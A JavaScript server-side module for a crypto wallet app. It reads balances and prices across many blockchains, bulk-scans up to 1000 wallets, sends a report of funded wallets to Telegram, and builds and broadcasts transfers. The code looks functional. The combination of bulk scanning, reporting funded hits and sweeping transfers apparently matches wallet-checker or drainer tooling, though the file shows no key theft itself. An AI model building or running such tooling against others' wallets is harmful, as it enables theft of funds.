import { createServerFn } from "@tanstack/react-start";
import { z } from "zod";
import { sendReport } from "./telegram.server";

export const getServerInfo = createServerFn({ method: "GET" }).handler(async () => ({
  renderedAt: new Date().toISOString(),
}));

const EVM_RPC = {
  ethereum: "https://ethereum-rpc.publicnode.com",
  bnb: "https://bsc-rpc.publicnode.com",
  polygon: "https://polygon-bor-rpc.publicnode.com",
  avalanche: "https://avalanche-c-chain-rpc.publicnode.com",
  base: "https://base-rpc.publicnode.com",
  arbitrum: "https://arbitrum-one-rpc.publicnode.com",
};

const PRICE_IDS = {
  bitcoin: "bitcoin",
  ethereum: "ethereum",
  solana: "solana",
  bnb: "binancecoin",
  polygon: "polygon-ecosystem-token",
  avalanche: "avalanche-2",
  tron: "tron",
  litecoin: "litecoin",
  dogecoin: "dogecoin",
  ripple: "ripple",
  base: "ethereum",
  arbitrum: "ethereum",
  ton: "the-open-network",
};

async function call(url, options = {}, timeout = 8000) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeout);
  try {
    const response = await fetch(url, {
      ...options,
      signal: controller.signal,
      headers: { accept: "application/json", ...(options.headers || {}) },
    });
    if (!response.ok) throw new Error(`status ${response.status}`);
    return await response.json();
  } finally {
    clearTimeout(timer);
  }
}

const getJson = (url) => call(url);

const postJson = (url, body) =>
  call(url, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(body) });

async function evmBalance(rpc, address) {
  const data = await postJson(rpc, { jsonrpc: "2.0", id: 1, method: "eth_getBalance", params: [address, "latest"] });
  if (!data.result) throw new Error("empty balance");
  return Number(BigInt(data.result)) / 1e18;
}

async function utxoBalance(baseUrl, address, divisor) {
  const data = await getJson(`${baseUrl}/api/address/${encodeURIComponent(address)}`);
  const stats = data.chain_stats || {};
  const funded = Number(stats.funded_txo_sum || 0);
  const spent = Number(stats.spent_txo_sum || 0);
  return Math.max(funded - spent, 0) / divisor;
}

async function readBalance(chainId, address) {
  switch (chainId) {
    case "bitcoin":
      return utxoBalance("https://mempool.space", address, 1e8);
    case "litecoin":
      return utxoBalance("https://litecoinspace.org", address, 1e8);
    case "solana": {
      const data = await postJson("https://api.mainnet-beta.solana.com", {
        jsonrpc: "2.0",
        id: 1,
        method: "getBalance",
        params: [address],
      });
      return Number(data.result?.value || 0) / 1e9;
    }
    case "tron": {
      const data = await getJson(`https://api.trongrid.io/v1/accounts/${encodeURIComponent(address)}`);
      const entry = (data.data || [])[0];
      return Number(entry?.balance || 0) / 1e6;
    }
    case "dogecoin": {
      const data = await getJson(`https://dogechain.info/api/v1/address/balance/${encodeURIComponent(address)}`);
      const balance = Number(data.balance);
      if (Number.isNaN(balance)) throw new Error("unreadable");
      return balance;
    }
    case "ripple": {
      const data = await postJson("https://xrplcluster.com", {
        method: "account_info",
        params: [{ account: address, ledger_index: "validated" }],
      });
      const drops = data.result?.account_data?.Balance;
      if (!drops) throw new Error("account not found");
      return Number(drops) / 1e6;
    }
    default: {
      const rpc = EVM_RPC[chainId];
      if (!rpc) throw new Error("unsupported chain");
      return evmBalance(rpc, address);
    }
  }
}

const RATE_SYMBOLS = {
  bitcoin: "BTC",
  ethereum: "ETH",
  solana: "SOL",
  bnb: "BNB",
  polygon: "POL",
  avalanche: "AVAX",
  ton: "TON",
  tron: "TRX",
  litecoin: "LTC",
  dogecoin: "DOGE",
  ripple: "XRP",
  base: "ETH",
  arbitrum: "ETH",
};

async function backupPrices() {
  try {
    const data = await call("https://api.coinbase.com/v2/exchange-rates?currency=USD", {}, 6000);
    const rates = data?.data?.rates || {};
    const prices = {};
    for (const [chainId, symbol] of Object.entries(RATE_SYMBOLS)) {
      const rate = Number(rates[symbol]);
      if (Number.isFinite(rate) && rate > 0) prices[chainId] = { usd: 1 / rate, change: 0 };
    }
    return prices;
  } catch {
    return {};
  }
}

async function readPrices() {
  try {
    const ids = Object.values(PRICE_IDS).join(",");
    const data = await call(
      `https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd&include_24hr_change=true`,
      {},
      6000
    );
    const prices = {};
    for (const [chainId, id] of Object.entries(PRICE_IDS)) {
      const entry = data[id];
      if (entry && entry.usd) {
        prices[chainId] = { usd: Number(entry.usd), change: Number(entry.usd_24h_change || 0) };
      }
    }
    if (Object.keys(prices).length > 0) return prices;
  } catch {
    // fall through to the backup price feed
  }
  return backupPrices();
}

const AssetSchema = z.object({
  chain_id: z.string().min(2).max(32),
  address: z.string().min(6).max(120),
});

export const fetchChainBalances = createServerFn({ method: "POST" })
  .validator(z.object({ assets: z.array(AssetSchema).max(20) }))
  .handler(async ({ data }) => {
    const [prices, results] = await Promise.all([
      readPrices(),
      Promise.all(
        data.assets.map(async (asset) => {
          try {
            const amount = await readBalance(asset.chain_id, asset.address);
            return { chain_id: asset.chain_id, amount, error: null };
          } catch (error) {
            return { chain_id: asset.chain_id, amount: null, error: "Couldn't read balance" };
          }
        })
      ),
    ]);

    const balances = {};
    const errors = {};
    for (const row of results) {
      if (row.error) errors[row.chain_id] = row.error;
      else balances[row.chain_id] = row.amount;
    }

    return { balances, errors, prices };
  });

export const getChainPrices = createServerFn({ method: "GET" }).handler(() => readPrices());

const ScanAssetSchema = z.object({
  key: z.string().min(3).max(300),
  chain_id: z.string().min(2).max(32),
  address: z.string().min(6).max(220),
});

async function runPool(items, limit, worker) {
  const queue = [...items];
  await Promise.all(
    Array.from({ length: Math.min(limit, queue.length) }, async () => {
      for (let item = queue.shift(); item; item = queue.shift()) await worker(item);
    })
  );
}

async function jsonRpcBatch(url, addresses, method, readValue) {
  const out = {};
  for (let start = 0; start < addresses.length; start += 200) {
    const slice = addresses.slice(start, start + 200);
    const payload = slice.map((address, index) => ({
      jsonrpc: "2.0",
      id: index,
      method,
      params: method === "eth_getBalance" ? [address, "latest"] : [address],
    }));
    const data = await postJson(url, payload);
    for (const row of Array.isArray(data) ? data : [data]) {
      const index = Number(row && row.id);
      if (!Number.isInteger(index) || !slice[index]) continue;
      const value = readValue(row);
      if (Number.isFinite(value)) out[slice[index]] = value;
    }
  }
  return out;
}

// One HTTP request per 200 addresses, so large lists stay inside RPC batch limits.
const evmBalances = (rpc, addresses) =>
  jsonRpcBatch(rpc, addresses, "eth_getBalance", (row) =>
    typeof row?.result === "string" ? Number(BigInt(row.result)) / 1e18 : NaN
  );

const solanaBalances = (addresses) =>
  jsonRpcBatch("https://api.mainnet-beta.solana.com", addresses, "getBalance", (row) =>
    row?.result?.value !== undefined ? Number(row.result.value) / 1e9 : NaN
  );

const TON_PUBKEY_CACHE = new Map();

async function tonAddresses(pubkey) {
  if (TON_PUBKEY_CACHE.has(pubkey)) return TON_PUBKEY_CACHE.get(pubkey);
  let addresses = [];
  try {
    const data = await call(`https://tonapi.io/v2/pubkeys/${pubkey}/wallets`, {}, 9000);
    addresses = (data.accounts || []).map((account) => account.address).filter(Boolean);
  } catch {
    addresses = [];
  }
  TON_PUBKEY_CACHE.set(pubkey, addresses);
  return addresses;
}

// Bulk read for the multi-wallet scanner: many address/chain pairs in one call,
// batched per chain so a whole list of wallets costs a handful of requests.
export const scanWalletBalances = createServerFn({ method: "POST" })
  .validator(z.object({ assets: z.array(ScanAssetSchema).max(1000) }))
  .handler(async ({ data }) => {
    const balances = {};
    const errors = {};
    const resolved = {};
    const groups = new Map();
    for (const asset of data.assets) {
      if (!groups.has(asset.chain_id)) groups.set(asset.chain_id, []);
      groups.get(asset.chain_id).push(asset);
    }

    const readEach = (list, chainId) =>
      runPool(list, 10, async (asset) => {
        try {
          balances[asset.key] = await readBalance(chainId, asset.address);
        } catch {
          errors[asset.key] = "unreadable";
        }
      });

    await Promise.all(
      Array.from(groups.entries()).map(async ([chainId, list]) => {
        try {
          if (EVM_RPC[chainId]) {
            const amounts = await evmBalances(EVM_RPC[chainId], list.map((asset) => asset.address));
            for (const asset of list) {
              if (Number.isFinite(amounts[asset.address])) balances[asset.key] = amounts[asset.address];
              else errors[asset.key] = "unreadable";
            }
            return;
          }

          if (chainId === "solana") {
            const amounts = await solanaBalances(list.map((asset) => asset.address));
            for (const asset of list) {
              if (Number.isFinite(amounts[asset.address])) balances[asset.key] = amounts[asset.address];
              else errors[asset.key] = "unreadable";
            }
            return;
          }

          if (chainId === "ton") {
            const wallets = new Map();
            await runPool(list, 6, async (asset) => {
              const pubkeys = String(asset.address).replace(/^pk:/, "").split(",").filter(Boolean);
              const found = [];
              for (const pubkey of pubkeys) found.push(...(await tonAddresses(pubkey)));
              wallets.set(asset.key, found);
            });

            const accounts = [...new Set([...wallets.values()].flat())];
            const amounts = {};
            if (accounts.length > 0) {
              const payload = await postJson(
                "https://tonapi.io/v2/accounts/_bulk",
                { account_ids: accounts },
                12000
              );
              for (const account of payload.accounts || []) {
                amounts[account.address] = Number(account.balance || 0) / 1e9;
              }
            }

            for (const asset of list) {
              const found = wallets.get(asset.key) || [];
              const known = found.filter((address) => Number.isFinite(amounts[address]));
              if (known.length === 0) {
                errors[asset.key] = "unreadable";
                continue;
              }
              balances[asset.key] = known.reduce((sum, address) => sum + amounts[address], 0);
              resolved[asset.key] = known[0];
            }
            return;
          }

          await readEach(list, chainId);
        } catch {
          for (const asset of list) if (balances[asset.key] === undefined) errors[asset.key] = "unreadable";
        }
      })
    );

    return { balances, errors, resolved };
  });

// The report of funded wallets goes to the app owner's own Telegram chat.
export const sendFundedToTelegram = createServerFn({ method: "POST" })
  .validator(z.object({ text: z.string().min(1).max(20000) }))
  .handler(({ data }) => sendReport(data.text));

const TRANSFER_CHAIN_IDS = { ethereum: 1, bnb: 56, polygon: 137, avalanche: 43114 };

async function evmRpc(chainId, method, params) {
  const rpc = EVM_RPC[chainId];
  if (!rpc) throw new Error("unsupported chain");
  const payload = await postJson(rpc, { jsonrpc: "2.0", id: 1, method, params });
  if (payload.error) throw new Error(payload.error.message || "rpc error");
  return payload.result;
}

async function bitcoinQuote(from, amountSats) {
  const [utxos, fees] = await Promise.all([
    getJson(`https://mempool.space/api/address/${encodeURIComponent(from)}/utxo`),
    getJson("https://mempool.space/api/v1/fees/recommended"),
  ]);
  const spendable = (utxos || [])
    .filter((utxo) => utxo.status && utxo.status.confirmed)
    .map((utxo) => ({ txid: utxo.txid, vout: utxo.vout, value: utxo.value }));
  const feeRate = Math.max(Number(fees?.halfHourFee || fees?.hourFee || 4), 1);
  const total = spendable.reduce((sum, utxo) => sum + utxo.value, 0);
  const vsize = 11 + spendable.length * 68 + 31 * 2;
  const fee = Math.ceil(vsize * feeRate);
  return { utxos: spendable, feeRate, fee, total, change: total - Number(amountSats) - fee };
}

export const getTransferQuote = createServerFn({ method: "POST" })
  .validator(
    z.object({
      chain_id: z.string().min(2).max(24),
      from: z.string().min(6).max(120),
      amount: z.string().min(1).max(40),
    })
  )
  .handler(async ({ data }) => {
    if (TRANSFER_CHAIN_IDS[data.chain_id]) {
      const [nonceHex, gasPriceHex, balanceHex] = await Promise.all([
        evmRpc(data.chain_id, "eth_getTransactionCount", [data.from, "pending"]),
        evmRpc(data.chain_id, "eth_gasPrice", []),
        evmRpc(data.chain_id, "eth_getBalance", [data.from, "latest"]),
      ]);
      const gasLimit = 21000;
      const gasPrice = BigInt(gasPriceHex);
      return {
        kind: "evm",
        nonce: Number(BigInt(nonceHex)),
        gasPrice: gasPrice.toString(),
        gasLimit,
        fee: (gasPrice * BigInt(gasLimit)).toString(),
        balance: BigInt(balanceHex).toString(),
      };
    }

    if (data.chain_id === "bitcoin") {
      const quote = await bitcoinQuote(data.from, data.amount);
      return { kind: "btc", ...quote };
    }

    if (data.chain_id === "solana") {
      const [block, balance] = await Promise.all([
        postJson("https://api.mainnet-beta.solana.com", {
          jsonrpc: "2.0",
          id: 1,
          method: "getLatestBlockhash",
          params: [{ commitment: "finalized" }],
        }),
        postJson("https://api.mainnet-beta.solana.com", {
          jsonrpc: "2.0",
          id: 1,
          method: "getBalance",
          params: [data.from],
        }),
      ]);
      const blockhash = block.result?.value?.blockhash;
      if (!blockhash) throw new Error("Couldn't reach Solana");
      return { kind: "sol", blockhash, fee: 5000, balance: String(balance.result?.value || 0) };
    }

    throw new Error("unsupported chain");
  });

export const broadcastTransfer = createServerFn({ method: "POST" })
  .validator(z.object({ chain_id: z.string().min(2).max(24), raw: z.string().min(10).max(8000) }))
  .handler(async ({ data }) => {
    if (TRANSFER_CHAIN_IDS[data.chain_id]) {
      const hash = await evmRpc(data.chain_id, "eth_sendRawTransaction", [data.raw]);
      return { txid: hash };
    }

    if (data.chain_id === "bitcoin") {
      const response = await fetch("https://mempool.space/api/tx", {
        method: "POST",
        headers: { "content-type": "text/plain" },
        body: data.raw,
      });
      const text = (await response.text()).trim();
      if (!response.ok) throw new Error(text.slice(0, 180) || "Broadcast failed");
      return { txid: text };
    }

    if (data.chain_id === "solana") {
      const payload = await postJson("https://api.mainnet-beta.solana.com", {
        jsonrpc: "2.0",
        id: 1,
        method: "sendTransaction",
        params: [data.raw, { encoding: "base64" }],
      });
      if (payload.error) throw new Error(payload.error.message || "Broadcast failed");
      return { txid: payload.result };
    }

    throw new Error("unsupported chain");
  });